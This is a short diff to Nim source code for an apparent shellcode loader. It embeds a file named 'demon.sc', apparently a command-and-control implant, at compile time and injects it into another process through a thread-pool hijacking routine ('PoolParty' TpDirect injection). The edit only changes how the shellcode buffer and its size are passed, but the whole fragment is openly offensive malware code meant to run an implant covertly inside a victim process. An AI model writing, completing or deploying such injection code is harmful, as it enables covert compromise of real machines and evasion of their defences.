@@ -7,8 +7,7 @@ import utils/stdlib/[stringh]
 
 # Read in shellcode at compile time
 const 
-  buf   = staticRead("demon.sc").cstring
-  szBuf = 103935
+  buf   = staticRead("demon.sc")
 
 proc getProcessIdViaNtQueryFunc(szProcessName: pointer, pdwProcessId: var DWORD, phProcess: ptr HANDLE = cast[ptr HANDLE](0)): bool =
   var 
@@ -85,7 +84,9 @@ proc doPoolPartyTpDirect(pBuf: pointer, szBuf: int): bool =
   return injectViaTpDirect(hProc, rPayload, hHiJack)
 
 proc injectViaThreadpool() = 
-  var pBuf = buf
+  var 
+    pBuf = buf.cstring
+    szBuf = buf.len
 
   discard doPoolPartyTpDirect(pBuf, szBuf)
 
